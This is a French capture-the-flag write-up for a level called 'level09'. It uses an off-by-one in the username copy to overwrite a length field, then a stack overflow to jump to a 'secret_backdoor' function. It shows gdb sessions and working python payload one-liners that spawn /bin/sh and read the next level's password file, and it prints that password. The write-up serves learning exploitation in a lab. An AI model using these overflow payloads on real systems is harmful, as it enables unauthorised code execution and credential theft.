En observant le code, on se rend compte qu'il existe une fonction "secret_backdoor" qu'on aimerait utiliser pour pouvoir lire le fichier .pass.
On se rend compte en lisant le code qu'une copie de 41 caractères est effectué sur l'entrée username qui contient pourtant 40 caractères.

On va donc pouvoir réécrire la taille de len dans la structure, ce qui va nous permettre potentiellement d'appeler la fonction secret_backdoor.

Pour commencer, on va chercher l'adresse de secret backdoor.

gdb level09
info func
> 0x000000000000088c  secret_backdoor

Cette adresse est un peu étrange, mais on va la tester.

Il faut auparavant connaître l'offset.

Pour se faire, on va lancer le programme depuis gdb et le faire crasher, puis regarder $rsp, le registre qui gère la pile.

(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level09/level09
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?
>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA¦>: Msg @Unix-Dude
>>: a123456789b123456789c123456789d123456789e123456789f123456789g123456789h123456789i123456789j123456789k123456789l123456789m123456789n123456789o123456789p123456789q123456789r123456789s123456789t123456789u123456789v123456789w123456789x123456789y123456789z123456789
>: Msg sent!
(gdb) info functions secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000000000000088c  secret_backdoor


On a donc notre offset au caractère 200 pour le mot de passe et l'adresse de notre fonction secret-backdoor qu'on va pouvoir reecrire sur l'eip.
Ceci dit, notre overflow ne sera pas possible a cause de la verification due a la variable len de la structure s_msg.

La variable etant stockee dans une structure a la suite de notre username, il est possible de remplacer sa valeur par un byte qu'on injecterait apres le caractere 40 (taille de notre username), par exemple \xff\xff pour pouvoir ecrire jusque 65536 caracteres.

(python -c 'print "A"*40+"\xff"+"\n"+"A"*200+"\x8c\x08\x00\x00\x00\x00\x00"+"\n"+"/bin/sh\n"'; cat) | ./level09

Ça ne fonctionne pas...

Après un certain temps de recherche, on découvre que l'"Address space layout randomization" est quelque chose qui existe.
En gros, on a l'adresse de notre fonction backdoor qui sera placée à un endroit différent dans la mémoire à chaque utilisation.

Nous devons donc le désactiver.

(gdb) set disable-randomization off
(gdb) r
Starting program: /home/users/level09/level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: test
>: Welcome, test
>: Msg @Unix-Dude
>>: test
>: Msg sent!
[Inferior 1 (process 1722) exited normally]
(gdb) info functions secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor

En lançant le programme plusieurs fois de cette manière, on se rend compte que la même adresse est utilisée à chaque fois pour le secret backdoor, ce qui rend possible le fait de l'appeller par la méthode précédente.
Ainsi:

(python -c 'print "A"*40+"\xff"+"\n" +"A"*200+"\x8c\x48\x55\x55\x55\x55\x00"+"\n"+"/bin/sh"'; cat) | ./level09

whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE